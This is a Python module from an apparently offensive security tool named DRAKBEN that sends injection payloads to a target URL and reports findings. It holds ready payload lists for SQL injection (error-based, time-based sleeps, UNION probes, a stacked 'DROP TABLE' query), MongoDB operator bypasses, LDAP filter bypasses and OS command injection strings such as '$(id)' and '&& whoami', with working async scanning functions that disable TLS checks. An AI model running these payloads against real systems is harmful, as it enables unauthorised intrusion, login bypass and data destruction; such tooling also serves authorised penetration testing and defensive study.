# modules/exploit/injection.py
"""
DRAKBEN Injection Module — SQL, NoSQL, LDAP, XPath, Command Injection.

Provides detection and exploitation functions for injection-class
vulnerabilities beyond what common.py covers.
"""

import logging
import re
import time
import urllib.parse
from typing import Any

import aiohttp

logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════
# SQL Injection — Advanced Techniques
# ═══════════════════════════════════════════════════════════

# Error signatures per DBMS for error-based detection
_DBMS_SIGNATURES: dict[str, list[str]] = {
    "mysql": [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "mysql_fetch",
        "SQLSTATE[",
    ],
    "postgresql": [
        "pg_query",
        "pg_exec",
        "valid PostgreSQL result",
        "PSQLException",
        "unterminated quoted string",
    ],
    "mssql": [
        "microsoft ole db provider",
        "sql server",
        "unclosed quotation mark",
        "ODBC SQL Server Driver",
        "[Microsoft][ODBC",
    ],
    "oracle": [
        "ORA-01756",
        "ORA-00933",
        "oracle error",
        "Oracle.*Driver",
        "quoted string not properly terminated",
    ],
    "sqlite": [
        "sqlite3.OperationalError",
        "SQLite/JDBCDriver",
        "unrecognized token",
        "SQLITE_ERROR",
    ],
}

# Time-based payloads per DBMS
_TIMEBASED_PAYLOADS: dict[str, list[str]] = {
    "mysql": [
        "' OR SLEEP(3)-- -",
        "' OR BENCHMARK(5000000,SHA1('test'))-- -",
        "1' AND (SELECT * FROM (SELECT SLEEP(3))a)-- -",
    ],
    "postgresql": [
        "'; SELECT pg_sleep(3)-- -",
        "' OR pg_sleep(3)-- -",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:3'-- -",
        "' OR WAITFOR DELAY '0:0:3'-- -",
    ],
    "sqlite": [
        "' OR randomblob(500000000)-- -",
    ],
}

# Union-based column detection payloads
_UNION_COLUMN_PROBES = [
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
]


def detect_dbms_from_error(response_text: str) -> str | None:
    """Identify the backend DBMS from error message signatures.

    Args:
        response_text: HTTP response body text.

    Returns:
        DBMS name or None if undetectable.

    """
    text_lower = response_text.lower()
    for dbms, signatures in _DBMS_SIGNATURES.items():
        for sig in signatures:
            if sig.lower() in text_lower:
                logger.info("Detected DBMS: %s (signature: %s)", dbms, sig)
                return dbms
    return None


def generate_error_payloads(param_value: str = "1") -> list[dict[str, str]]:
    """Generate error-based SQL injection test payloads.

    Args:
        param_value: Original parameter value to inject around.

    Returns:
        List of dicts with 'payload' and 'technique' keys.

    """
    return [
        {"payload": f"{param_value}'", "technique": "single_quote"},
        {"payload": f'{param_value}"', "technique": "double_quote"},
        {"payload": f"{param_value}\\", "technique": "backslash"},
        {"payload": f"{param_value}' OR '1'='1", "technique": "boolean_or"},
        {"payload": f"{param_value}' AND '1'='2", "technique": "boolean_and_false"},
        {"payload": f"{param_value}'; DROP TABLE test-- -", "technique": "stacked_query"},
        {"payload": f"{param_value}' UNION SELECT 1-- -", "technique": "union_probe"},
        {"payload": f"{param_value})) OR 1=1-- -", "technique": "parenthesis_escape"},
        {"payload": f"{param_value}' OR 1=1#", "technique": "hash_comment"},
        {"payload": f"{param_value}%27 OR 1=1-- -", "technique": "url_encoded_quote"},
    ]


async def test_sqli_error_based(
    target_url: str,
    param: str,
    *,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Test for error-based SQL injection on a URL parameter.

    Args:
        target_url: Target URL with injectable parameter.
        param: Parameter name to test.
        timeout: HTTP request timeout.

    Returns:
        Dict with 'vulnerable', 'dbms', 'payloads_tested', 'findings'.

    """
    findings: list[dict[str, Any]] = []
    detected_dbms: str | None = None
    payloads = generate_error_payloads()

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=timeout),
        connector=aiohttp.TCPConnector(ssl=False),
    ) as session:
        for entry in payloads:
            payload = entry["payload"]
            technique = entry["technique"]
            injected_url = _inject_param(target_url, param, payload)

            try:
                async with session.get(injected_url) as resp:
                    text = await resp.text()
                    dbms = detect_dbms_from_error(text)
                    if dbms:
                        detected_dbms = dbms
                        findings.append({
                            "technique": technique,
                            "payload": payload,
                            "dbms": dbms,
                            "status_code": resp.status,
                        })
                        logger.warning(
                            "SQLi error-based finding: %s on %s (DBMS: %s)",
                            technique, param, dbms,
                        )
            except (aiohttp.ClientError, TimeoutError, OSError) as e:
                logger.debug("Request failed for payload %s: %s", technique, e)

    return {
        "vulnerable": len(findings) > 0,
        "dbms": detected_dbms,
        "payloads_tested": len(payloads),
        "findings": findings,
    }


async def test_sqli_time_based(
    target_url: str,
    param: str,
    *,
    delay_threshold: float = 2.5,
    timeout: float = 15.0,
) -> dict[str, Any]:
    """Test for time-based blind SQL injection.

    Args:
        target_url: Target URL.
        param: Parameter name to test.
        delay_threshold: Minimum response delay to consider as positive.
        timeout: HTTP request timeout.

    Returns:
        Dict with 'vulnerable', 'dbms', 'measured_delays'.

    """
    findings: list[dict[str, Any]] = []

    # First measure baseline response time
    baseline_time = await _measure_response_time(target_url, timeout=timeout)

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=timeout),
        connector=aiohttp.TCPConnector(ssl=False),
    ) as session:
        for dbms, payloads in _TIMEBASED_PAYLOADS.items():
            for payload in payloads:
                injected_url = _inject_param(target_url, param, payload)
                start = time.monotonic()

                try:
                    async with session.get(injected_url) as resp:
                        await resp.text()
                        elapsed = time.monotonic() - start

                        if elapsed - baseline_time >= delay_threshold:
                            findings.append({
                                "dbms": dbms,
                                "payload": payload,
                                "delay": round(elapsed, 2),
                                "baseline": round(baseline_time, 2),
                            })
                            logger.warning(
                                "Time-based SQLi confirmed: %s (delay: %.2fs, baseline: %.2fs)",
                                dbms, elapsed, baseline_time,
                            )
                except (aiohttp.ClientError, TimeoutError, OSError):
                    continue

    detected_dbms = findings[0]["dbms"] if findings else None
    return {
        "vulnerable": len(findings) > 0,
        "dbms": detected_dbms,
        "measured_delays": findings,
    }


def generate_union_probes(max_columns: int = 10) -> list[str]:
    """Generate UNION-based column count detection payloads.

    Args:
        max_columns: Maximum number of columns to probe.

    Returns:
        List of UNION SELECT payloads with increasing NULL counts.

    """
    probes = []
    for n in range(1, max_columns + 1):
        nulls = ",".join(["NULL"] * n)
        probes.append(f"' UNION SELECT {nulls}-- -")
    return probes


# ═══════════════════════════════════════════════════════════
# NoSQL Injection
# ═══════════════════════════════════════════════════════════

_NOSQL_PAYLOADS: list[dict[str, Any]] = [
    {"payload": '{"$gt":""}', "technique": "mongodb_gt_bypass", "type": "json"},
    {"payload": '{"$ne":""}', "technique": "mongodb_ne_bypass", "type": "json"},
    {"payload": '{"$regex":".*"}', "technique": "mongodb_regex", "type": "json"},
    {"payload": "[$gt]=", "technique": "php_array_injection", "type": "query"},
    {"payload": '{"$where":"sleep(3000)"}', "technique": "mongodb_js_injection", "type": "json"},
    {"payload": "true, $where: '1 == 1'", "technique": "mongodb_where", "type": "query"},
]


async def test_nosql_injection(
    target_url: str,
    *,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Test for NoSQL injection vulnerabilities (MongoDB focus).

    Args:
        target_url: Target URL or API endpoint.
        timeout: Request timeout.

    Returns:
        Dict with 'vulnerable', 'findings'.

    """
    findings: list[dict[str, Any]] = []

    # Get baseline response
    baseline = await _get_baseline_response(target_url, timeout=timeout)
    if baseline is None:
        return {"vulnerable": False, "findings": [], "error": "Could not reach target"}

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=timeout),
        connector=aiohttp.TCPConnector(ssl=False),
    ) as session:
        for entry in _NOSQL_PAYLOADS:
            try:
                if entry["type"] == "json":
                    headers = {"Content-Type": "application/json"}
                    async with session.post(
                        target_url, data=entry["payload"], headers=headers,
                    ) as resp:
                        text = await resp.text()
                        if _is_nosql_vulnerable(text, baseline, resp.status):
                            findings.append({
                                "technique": entry["technique"],
                                "payload": entry["payload"],
                                "response_length": len(text),
                            })
                else:
                    injected = f"{target_url}?username{entry['payload']}"
                    async with session.get(injected) as resp:
                        text = await resp.text()
                        if _is_nosql_vulnerable(text, baseline, resp.status):
                            findings.append({
                                "technique": entry["technique"],
                                "payload": entry["payload"],
                            })
            except (aiohttp.ClientError, TimeoutError, OSError):
                continue

    return {
        "vulnerable": len(findings) > 0,
        "findings": findings,
    }


def _is_nosql_vulnerable(response: str, baseline: str, status: int) -> bool:
    """Check if NoSQL injection probe was successful.

    Args:
        response: Response text from injection probe.
        baseline: Baseline response text.
        status: HTTP status code.

    Returns:
        True if response suggests injection success.

    """
    if status == 200 and len(response) > len(baseline) * 1.5:
        return True
    return "MongoDB" in response or "MongoError" in response


# ═══════════════════════════════════════════════════════════
# LDAP Injection
# ═══════════════════════════════════════════════════════════

_LDAP_PAYLOADS = [
    {"payload": "*)(uid=*))(|(uid=*", "technique": "ldap_wildcard"},
    {"payload": "admin)(|(password=*)", "technique": "ldap_or_bypass"},
    {"payload": "*)(objectClass=*", "technique": "ldap_class_enum"},
    {"payload": "admin)(&)", "technique": "ldap_and_termination"},
    {"payload": "x)(|(cn=*)", "technique": "ldap_cn_dump"},
]


async def test_ldap_injection(
    target_url: str,
    param: str = "username",
    *,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Test for LDAP injection vulnerabilities.

    Args:
        target_url: Target URL with LDAP-backed auth.
        param: Parameter name to inject.
        timeout: Request timeout.

    Returns:
        Dict with 'vulnerable', 'findings'.

    """
    findings: list[dict[str, Any]] = []
    baseline = await _get_baseline_response(target_url, timeout=timeout)

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=timeout),
        connector=aiohttp.TCPConnector(ssl=False),
    ) as session:
        for entry in _LDAP_PAYLOADS:
            injected_url = _inject_param(target_url, param, entry["payload"])
            try:
                async with session.get(injected_url) as resp:
                    text = await resp.text()
                    if _is_ldap_vulnerable(text, baseline or "", resp.status):
                        findings.append({
                            "technique": entry["technique"],
                            "payload": entry["payload"],
                            "status_code": resp.status,
                        })
            except (aiohttp.ClientError, TimeoutError, OSError):
                continue

    return {"vulnerable": len(findings) > 0, "findings": findings}


def _is_ldap_vulnerable(response: str, baseline: str, status: int) -> bool:
    """Detect LDAP injection success indicators."""
    ldap_errors = ["ldap", "invalid dn", "bad search filter", "javax.naming"]
    text_lower = response.lower()
    for indicator in ldap_errors:
        if indicator in text_lower:
            return True
    return status == 200 and bool(baseline) and len(response) > len(baseline) * 2


# ═══════════════════════════════════════════════════════════
# Command Injection
# ═══════════════════════════════════════════════════════════

_CMD_PAYLOADS = [
    {"payload": "; id", "technique": "semicolon", "os": "linux"},
    {"payload": "| id", "technique": "pipe", "os": "linux"},
    {"payload": "$(id)", "technique": "subshell", "os": "linux"},
    {"payload": "`id`", "technique": "backtick", "os": "linux"},
    {"payload": " && whoami", "technique": "and_chain", "os": "both"},
    {"payload": " || whoami", "technique": "or_chain", "os": "both"},
    {"payload": "\nid", "technique": "newline", "os": "linux"},
    {"payload": "& whoami", "technique": "background", "os": "windows"},
]

_CMD_INDICATORS = [
    r"uid=\d+",           # Linux id output
    r"gid=\d+",           # Linux id output
    r"root:",             # /etc/passwd leak
    r"[a-z]+\\[a-z]+",   # Windows domain\user
    r"NT AUTHORITY",      # Windows system user
]


async def test_command_injection(
    target_url: str,
    param: str,
    *,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Test for OS command injection vulnerabilities.

    Args:
        target_url: Target URL.
        param: Parameter name to test.
        timeout: Request timeout.

    Returns:
        Dict with 'vulnerable', 'findings', 'os_detected'.

    """
    findings: list[dict[str, Any]] = []
    detected_os: str | None = None

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=timeout),
        connector=aiohttp.TCPConnector(ssl=False),
    ) as session:
        for entry in _CMD_PAYLOADS:
            injected_url = _inject_param(target_url, param, entry["payload"])
            try:
                async with session.get(injected_url) as resp:
                    text = await resp.text()
                    indicator = _check_cmd_injection(text)
                    if indicator:
                        detected_os = entry["os"]
                        findings.append({
                            "technique": entry["technique"],
                            "payload": entry["payload"],
                            "indicator": indicator,
                            "os": entry["os"],
                        })
                        logger.warning(
                            "Command injection found: %s (OS: %s)",
                            entry["technique"], entry["os"],
                        )
            except (aiohttp.ClientError, TimeoutError, OSError):
                continue

    return {
        "vulnerable": len(findings) > 0,
        "findings": findings,
        "os_detected": detected_os,
    }


def _check_cmd_injection(text: str) -> str | None:
    """Check response for command execution indicators."""
    for pattern in _CMD_INDICATORS:
        if re.search(pattern, text):
            return pattern
    return None


# ═══════════════════════════════════════════════════════════
# Utility Functions
# ═══════════════════════════════════════════════════════════

def _inject_param(url: str, param: str, payload: str) -> str:
    """Inject a payload into a URL parameter.

    Args:
        url: Original URL.
        param: Parameter name.
        payload: Injection payload.

    Returns:
        URL with injected payload.

    """
    encoded = urllib.parse.quote(payload, safe="")
    if "?" in url:
        return f"{url}&{param}={encoded}"
    return f"{url}?{param}={encoded}"


async def _measure_response_time(url: str, *, timeout: float = 10.0) -> float:
    """Measure baseline response time for a URL."""
    start = time.monotonic()
    try:
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=timeout),
            connector=aiohttp.TCPConnector(ssl=False),
        ) as session:
            async with session.get(url) as resp:
                await resp.text()
    except (aiohttp.ClientError, TimeoutError, OSError):
        pass
    return time.monotonic() - start


async def _get_baseline_response(url: str, *, timeout: float = 10.0) -> str | None:
    """Get baseline response body for comparison."""
    try:
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=timeout),
            connector=aiohttp.TCPConnector(ssl=False),
        ) as session:
            async with session.get(url) as resp:
                return await resp.text()
    except (aiohttp.ClientError, TimeoutError, OSError):
        return None
